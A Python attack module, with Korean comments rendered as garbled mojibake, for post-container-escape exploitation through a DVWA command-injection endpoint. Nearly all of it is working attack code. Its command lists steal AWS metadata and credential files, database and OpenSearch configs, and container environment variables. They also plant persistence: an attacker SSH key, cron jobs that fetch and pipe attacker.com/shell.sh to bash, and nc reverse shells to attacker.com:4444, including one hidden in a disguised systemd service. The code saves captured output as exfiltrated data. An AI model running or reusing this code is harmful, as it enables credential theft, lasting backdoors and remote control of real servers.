"""
Post Docker Escape Exploitation Module
Docker íƒˆì¶œ í›„ ì¶”ê°€ ê³µê²© ëª¨ë“ˆ (AWS, OpenSearch ë“±)
"""

import time
import re
import os
import json
from datetime import datetime
from utils.logger import log_attack, log_command_output, log_exfiltrated_data

# íƒˆì¶œ í›„ ì¶”ê°€ ê³µê²© ì˜µì…˜
POST_ESCAPE_ATTACKS = {
    'aws_takeover': {
        'name': 'AWS ê¶Œí•œ íƒˆì·¨',
        'description': 'EC2 ë©”íƒ€ë°ì´í„° ë° IAM ê¶Œí•œ íƒˆì·¨',
        'commands': [
            # IMDSv1 ë©”íƒ€ë°ì´í„°
            'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'curl -s http://169.254.169.254/latest/meta-data/instance-id',
            'curl -s http://169.254.169.254/latest/meta-data/ami-id',
            'curl -s http://169.254.169.254/latest/user-data',
            # AWS CLI ì„¤ì • í™•ì¸
            'cat ~/.aws/credentials 2>/dev/null',
            'cat /root/.aws/credentials 2>/dev/null',
            'cat /home/*/.aws/credentials 2>/dev/null',
            # í™˜ê²½ë³€ìˆ˜ì—ì„œ AWS í‚¤ íƒìƒ‰
            'env | grep -i "aws"',
            'cat /proc/*/environ 2>/dev/null | tr "\\0" "\\n" | grep -i "aws" | head -20',
        ]
    },
    'opensearch_takeover': {
        'name': 'OpenSearch/Kibana ì¥ì•…',
        'description': 'OpenSearch ë° Kibana ì„¤ì • íŒŒì¼ íƒˆì·¨',
        'commands': [
            # OpenSearch ì„¤ì •
            'find / -name "opensearch.yml" 2>/dev/null',
            'find / -name "elasticsearch.yml" 2>/dev/null',
            'cat /etc/opensearch/opensearch.yml 2>/dev/null',
            'cat /usr/share/opensearch/config/opensearch.yml 2>/dev/null',
            # Kibana ì„¤ì •
            'find / -name "kibana.yml" 2>/dev/null',
            'cat /etc/kibana/kibana.yml 2>/dev/null',
            'cat /usr/share/kibana/config/kibana.yml 2>/dev/null',
            # ì¸ì¦ ì •ë³´ ì°¾ê¸°
            'grep -r "password\\|username\\|elastic" /etc/opensearch/ 2>/dev/null | head -20',
            'grep -r "password\\|username\\|elastic" /etc/kibana/ 2>/dev/null | head -20',
            # Docker ì»¨í…Œì´ë„ˆì—ì„œ OpenSearch ì°¾ê¸°
            'docker ps -a | grep -i "opensearch\\|elastic\\|kibana" 2>/dev/null',
            # ë„¤íŠ¸ì›Œí¬ì—ì„œ OpenSearch í¬íŠ¸ ì°¾ê¸°
            'netstat -tlnp | grep -E "9200|9300|5601" 2>/dev/null',
        ]
    },
    'database_credentials': {
        'name': 'ë°ì´í„°ë² ì´ìŠ¤ í¬ë¦¬ë´ì…œ ìˆ˜ì§‘',
        'description': 'MySQL, PostgreSQL, MongoDB ë“± DB ì ‘ì† ì •ë³´ íƒˆì·¨',
        'commands': [
            # MySQL
            'cat /etc/mysql/my.cnf 2>/dev/null',
            'cat ~/.my.cnf 2>/dev/null',
            'grep -r "password" /etc/mysql/ 2>/dev/null | head -10',
            # PostgreSQL
            'cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null',
            'cat ~/.pgpass 2>/dev/null',
            # MongoDB
            'cat /etc/mongod.conf 2>/dev/null',
            # í™˜ê²½ë³€ìˆ˜
            'env | grep -i "db\\|database\\|mysql\\|postgres\\|mongo"',
            # Docker ì»´í¬ì¦ˆ íŒŒì¼
            'find / -name "docker-compose*.yml" -o -name "docker-compose*.yaml" 2>/dev/null | head -10',
            'cat /opt/*/docker-compose.yml 2>/dev/null | head -50',
        ]
    },
    'container_manipulation': {
        'name': 'ë‹¤ë¥¸ Docker ì»¨í…Œì´ë„ˆ ì¡°ì‘',
        'description': 'Docker ì†Œì¼“ ì ‘ê·¼ì„ í†µí•œ ë‹¤ë¥¸ ì»¨í…Œì´ë„ˆ ì œì–´',
        'commands': [
            # Docker ì†Œì¼“ í™•ì¸
            'ls -la /var/run/docker.sock',
            # Docker ëª…ë ¹ì–´ ì‚¬ìš© ê°€ëŠ¥ í™•ì¸
            'which docker',
            'docker version 2>/dev/null',
            # ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆ ëª©ë¡
            'docker ps -a',
            # ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ ëª©ë¡
            'docker images',
            # ë¯¼ê°í•œ ì»¨í…Œì´ë„ˆ ì°¾ê¸°
            'docker ps -a | grep -E "mysql|postgres|redis|elastic|mongo|admin|root"',
            # ì»¨í…Œì´ë„ˆ í™˜ê²½ë³€ìˆ˜ íƒˆì·¨
            'for c in $(docker ps -q); do echo "=== Container: $c ==="; docker inspect $c | grep -A5 "Env"; done 2>/dev/null',
        ]
    },
    'persistence_backdoor': {
        'name': 'ì˜êµ¬ ë°±ë„ì–´ ì„¤ì¹˜',
        'description': 'ì‹œìŠ¤í…œ ì¬ì‹œì‘ í›„ì—ë„ ìœ ì§€ë˜ëŠ” ë°±ë„ì–´ ì„¤ì¹˜',
        'commands': [
            # SSH í‚¤ ì¶”ê°€
            'mkdir -p /root/.ssh 2>/dev/null',
            'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@2sec" >> /root/.ssh/authorized_keys',
            'chmod 600 /root/.ssh/authorized_keys',
            # Cron ë°±ë„ì–´
            'echo "*/5 * * * * /bin/bash -c \"curl http://attacker.com/shell.sh | bash\" 2>/dev/null" | crontab -',
            'echo "@reboot /bin/bash -c \"nc -e /bin/bash attacker.com 4444\" &" >> /etc/crontab',
            # Systemd ì„œë¹„ìŠ¤ ë°±ë„ì–´
            'echo "[Unit]\\nDescription=System Monitoring\\n\\n[Service]\\nExecStart=/bin/bash -c \"while true; do nc -e /bin/bash attacker.com 4444; sleep 300; done\"\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/system-monitor.service',
            'systemctl enable system-monitor.service 2>/dev/null',
            'systemctl start system-monitor.service 2>/dev/null',
        ]
    }
}

def run_post_escape_attack(session, attack_type, delay=1):
    """
    Docker íƒˆì¶œ í›„ ì¶”ê°€ ê³µê²© ì‹¤í–‰

    Args:
        session: DVWA ì„¸ì…˜ ê°ì²´
        attack_type: ê³µê²© ìœ í˜• (aws_takeover, opensearch_takeover ë“±)
        delay: ìš”ì²­ ê°„ ì§€ì—° ì‹œê°„

    Returns:
        dict: ê³µê²© ê²°ê³¼
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': [],
        'saved_files': []
    }

    if attack_type not in POST_ESCAPE_ATTACKS:
        print(f"  [-] ì•Œ ìˆ˜ ì—†ëŠ” ê³µê²© ìœ í˜•: {attack_type}")
        return results

    attack = POST_ESCAPE_ATTACKS[attack_type]
    print(f"\n  [*] {attack['name']} ì‹œì‘...")
    print(f"  [*] {attack['description']}")

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    # ë°ì´í„° ì €ì¥ ë””ë ‰í† ë¦¬
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    save_dir = f"exfiltrated_data/post_docker_{attack_type}_{timestamp}"
    os.makedirs(save_dir, exist_ok=True)

    for cmd in attack['commands']:
        results['attempts'] += 1

        try:
            print(f"\n  [>] ì‹¤í–‰: {cmd[:80]}...")

            payload = f"127.0.0.1; {cmd}"
            data = {'ip': payload, 'Submit': 'Submit'}
            response = session.session.post(cmdi_url, data=data)
            output = extract_command_output(response.text)

            if output and len(output) > 5:
                results['successful'] += 1

                # ë°ì´í„° ì €ì¥
                filename = f"{attack_type}_{results['successful']}.txt"
                filepath = os.path.join(save_dir, filename)

                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(f"Attack: {attack['name']}\n")
                    f.write(f"Command: {cmd}\n")
                    f.write(f"Timestamp: {datetime.now()}\n")
                    f.write(f"{'='*80}\n\n")
                    f.write(output)

                results['saved_files'].append(filepath)
                results['findings'].append({
                    'command': cmd,
                    'output': output,
                    'file': filepath
                })

                # ì¤‘ìš” ë°œê²¬ ì‚¬í•­ í‘œì‹œ
                analyze_findings(attack_type, cmd, output)

                print(f"      [+] ì„±ê³µ: {len(output)} bytes ìˆ˜ì§‘")
                print(f"      [ğŸ“] ì €ì¥ë¨: {filepath}")

                log_command_output(cmd, f"POST_DOCKER_{attack_type.upper()}", output)
                log_attack(
                    f'POST_DOCKER_{attack_type.upper()}',
                    'SUCCESS',
                    f"Command: {cmd}",
                    response.status_code,
                    len(response.text)
                )

            else:
                print(f"      [-] ì‹¤íŒ¨ ë˜ëŠ” ë¹ˆ ì‘ë‹µ")

            time.sleep(delay)

        except Exception as e:
            print(f"      [!] ì˜¤ë¥˜: {str(e)}")
            log_attack(f'POST_DOCKER_{attack_type.upper()}', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

    # ê²°ê³¼ ìš”ì•½
    print_attack_summary(attack_type, results)

    if results['successful'] > 0:
        results['success'] = True

    return results

def analyze_findings(attack_type, cmd, output):
    """ë°œê²¬ì‚¬í•­ ë¶„ì„ ë° ì¤‘ìš” ì •ë³´ í‘œì‹œ"""

    if attack_type == 'aws_takeover':
        # AWS í¬ë¦¬ë´ì…œ ë°œê²¬
        if 'AccessKeyId' in output or 'SecretAccessKey' in output:
            print(f"      [!!!] AWS í¬ë¦¬ë´ì…œ ë°œê²¬! IAM ê¶Œí•œ íƒˆì·¨ ê°€ëŠ¥!")
        elif 'aws_access_key_id' in output:
            print(f"      [!!!] AWS CLI ì„¤ì • íŒŒì¼ ë°œê²¬!")
        elif 'instance-id' in output or 'i-' in output:
            print(f"      [!] EC2 ì¸ìŠ¤í„´ìŠ¤ ì •ë³´ ë°œê²¬")

    elif attack_type == 'opensearch_takeover':
        # OpenSearch/Kibana ì„¤ì • ë°œê²¬
        if 'opensearch.yml' in output or 'elasticsearch.yml' in output:
            print(f"      [!!!] OpenSearch ì„¤ì • íŒŒì¼ ë°œê²¬!")
        elif 'kibana.yml' in output:
            print(f"      [!!!] Kibana ì„¤ì • íŒŒì¼ ë°œê²¬!")
        elif 'password' in output.lower() or 'elastic:' in output:
            print(f"      [!!!] ì¸ì¦ ì •ë³´ ë°œê²¬!")
        elif '9200' in output or '5601' in output:
            print(f"      [!] OpenSearch/Kibana ì„œë¹„ìŠ¤ í¬íŠ¸ ë°œê²¬")

    elif attack_type == 'database_credentials':
        # DB í¬ë¦¬ë´ì…œ ë°œê²¬
        if 'password=' in output or 'password:' in output:
            print(f"      [!!!] ë°ì´í„°ë² ì´ìŠ¤ ë¹„ë°€ë²ˆí˜¸ ë°œê²¬!")
        elif 'mysql' in output.lower() or 'postgres' in output.lower():
            print(f"      [!] ë°ì´í„°ë² ì´ìŠ¤ ì„¤ì • íŒŒì¼ ë°œê²¬")
        elif 'docker-compose' in output:
            print(f"      [!] Docker Compose íŒŒì¼ ë°œê²¬ - DB ì •ë³´ í¬í•¨ ê°€ëŠ¥")

    elif attack_type == 'container_manipulation':
        # Docker ì ‘ê·¼ ê°€ëŠ¥
        if '/var/run/docker.sock' in output and 'rw' in output:
            print(f"      [!!!] Docker ì†Œì¼“ ì“°ê¸° ê¶Œí•œ! ëª¨ë“  ì»¨í…Œì´ë„ˆ ì œì–´ ê°€ëŠ¥!")
        elif 'CONTAINER ID' in output:
            print(f"      [!] ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆ ëª©ë¡ íšë“")
        elif '"Env"' in output:
            print(f"      [!!!] ì»¨í…Œì´ë„ˆ í™˜ê²½ë³€ìˆ˜ íƒˆì·¨ - í¬ë¦¬ë´ì…œ í¬í•¨ ê°€ëŠ¥!")

    elif attack_type == 'persistence_backdoor':
        # ë°±ë„ì–´ ì„¤ì¹˜ ì„±ê³µ
        if 'authorized_keys' in cmd and not 'No such file' in output:
            print(f"      [!!!] SSH ë°±ë„ì–´ í‚¤ ì„¤ì¹˜ ì„±ê³µ!")
        elif 'crontab' in cmd and not 'error' in output.lower():
            print(f"      [!!!] Cron ë°±ë„ì–´ ì„¤ì¹˜ ì„±ê³µ!")
        elif 'systemctl' in cmd and 'enabled' in output:
            print(f"      [!!!] Systemd ë°±ë„ì–´ ì„œë¹„ìŠ¤ ë“±ë¡ ì„±ê³µ!")

def extract_command_output(html_response):
    """HTML ì‘ë‹µì—ì„œ ëª…ë ¹ì–´ ì¶œë ¥ ì¶”ì¶œ"""
    try:
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
        if pre_match:
            output = pre_match.group(1)
        else:
            textarea_match = re.search(r'<textarea[^>]*>(.*?)</textarea>', html_response, re.DOTALL | re.IGNORECASE)
            if textarea_match:
                output = textarea_match.group(1)
            else:
                return ""

        # HTML ì—”í‹°í‹° ë””ì½”ë”©
        output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        output = output.replace('&quot;', '"').replace('&#039;', "'")

        # ping ì œê±°
        lines = output.split('\n')
        filtered_lines = []
        in_ping_section = False

        for line in lines:
            if 'PING 127.0.0.1' in line:
                in_ping_section = True
                continue
            if in_ping_section:
                if any(x in line for x in ['bytes from', 'ping statistics', 'packets transmitted', 'round-trip', 'rtt min']):
                    continue
                if line.startswith('---') or not line.strip():
                    continue
                in_ping_section = False
            if line.strip():
                filtered_lines.append(line)

        return '\n'.join(filtered_lines).strip()
    except Exception:
        return ""

def print_attack_summary(attack_type, results):
    """ê³µê²© ê²°ê³¼ ìš”ì•½"""
    attack = POST_ESCAPE_ATTACKS[attack_type]

    print(f"\n  {'='*60}")
    print(f"  {attack['name']} ê²°ê³¼")
    print(f"  {'='*60}")

    print(f"\n  ì´ ì‹œë„: {results['attempts']}íšŒ")
    print(f"  ì„±ê³µ: {results['successful']}íšŒ")

    if results['successful'] > 0:
        print(f"\n  [ğŸ¯] ê³µê²© ì„±ê³µ! ìˆ˜ì§‘ëœ ì •ë³´:")

        # ê³µê²© ìœ í˜•ë³„ ì„±ê³µ ë©”ì‹œì§€
        if attack_type == 'aws_takeover':
            print(f"     âœ“ AWS ë©”íƒ€ë°ì´í„° ë° í¬ë¦¬ë´ì…œ ìˆ˜ì§‘")
            print(f"     âœ“ EC2 ì¸ìŠ¤í„´ìŠ¤ ì •ë³´ íšë“")
            print(f"     ğŸ’¡ ë‹¤ìŒ ë‹¨ê³„: AWS CLIë¡œ ê¶Œí•œ í™•ì¸ ë° ì¶”ê°€ ë¦¬ì†ŒìŠ¤ ì ‘ê·¼")

        elif attack_type == 'opensearch_takeover':
            print(f"     âœ“ OpenSearch/Kibana ì„¤ì • íŒŒì¼ ìˆ˜ì§‘")
            print(f"     âœ“ ì¸ì¦ ì •ë³´ ë° í¬íŠ¸ ì •ë³´ íšë“")
            print(f"     ğŸ’¡ ë‹¤ìŒ ë‹¨ê³„: ìˆ˜ì§‘ëœ í¬ë¦¬ë´ì…œë¡œ OpenSearch ì ‘ê·¼ ì‹œë„")

        elif attack_type == 'database_credentials':
            print(f"     âœ“ ë°ì´í„°ë² ì´ìŠ¤ ì„¤ì • íŒŒì¼ ìˆ˜ì§‘")
            print(f"     âœ“ DB ì ‘ì† ì •ë³´ íšë“")
            print(f"     ğŸ’¡ ë‹¤ìŒ ë‹¨ê³„: DB ì ‘ì† ë° ë°ì´í„° íƒˆì·¨")

        elif attack_type == 'container_manipulation':
            print(f"     âœ“ Docker í™˜ê²½ ì •ë³´ ìˆ˜ì§‘")
            print(f"     âœ“ ì»¨í…Œì´ë„ˆ ëª©ë¡ ë° ì„¤ì • íšë“")
            print(f"     ğŸ’¡ ë‹¤ìŒ ë‹¨ê³„: ë‹¤ë¥¸ ì»¨í…Œì´ë„ˆ ì¹¨íˆ¬ ë° ì œì–´")

        elif attack_type == 'persistence_backdoor':
            print(f"     âœ“ ì˜êµ¬ ë°±ë„ì–´ ì„¤ì¹˜ ì‹œë„")
            print(f"     âœ“ ë‹¤ì¤‘ ì§€ì†ì„± ë©”ì»¤ë‹ˆì¦˜ êµ¬ì„±")
            print(f"     ğŸ’¡ ë‹¤ìŒ ë‹¨ê³„: ë°±ë„ì–´ ì—°ê²° í…ŒìŠ¤íŠ¸ ë° ì€ë‹‰")

        if results['saved_files']:
            print(f"\n  ğŸ“ ìˆ˜ì§‘ëœ ë°ì´í„°:")
            save_dir = os.path.dirname(results['saved_files'][0])
            print(f"     {save_dir}/")
            print(f"     â””â”€ {len(results['saved_files'])}ê°œ íŒŒì¼ ì €ì¥ë¨")

    else:
        print(f"\n  [-] ê³µê²© ì‹¤íŒ¨ - ë°ì´í„° ìˆ˜ì§‘ ë¶ˆê°€")

def list_available_attacks():
    """ì‚¬ìš© ê°€ëŠ¥í•œ ê³µê²© ëª©ë¡ ì¶œë ¥"""
    print("\n[*] Docker íƒˆì¶œ í›„ ì‚¬ìš© ê°€ëŠ¥í•œ ì¶”ê°€ ê³µê²©:")
    print("="*60)

    for key, attack in POST_ESCAPE_ATTACKS.items():
        print(f"\n  [{key}]")
        print(f"    ì´ë¦„: {attack['name']}")
        print(f"    ì„¤ëª…: {attack['description']}")

    print(f"\nì‚¬ìš©ë²•: post-docker <ê³µê²©ìœ í˜•>")
    print(f"ì˜ˆì‹œ: post-docker aws_takeover\n")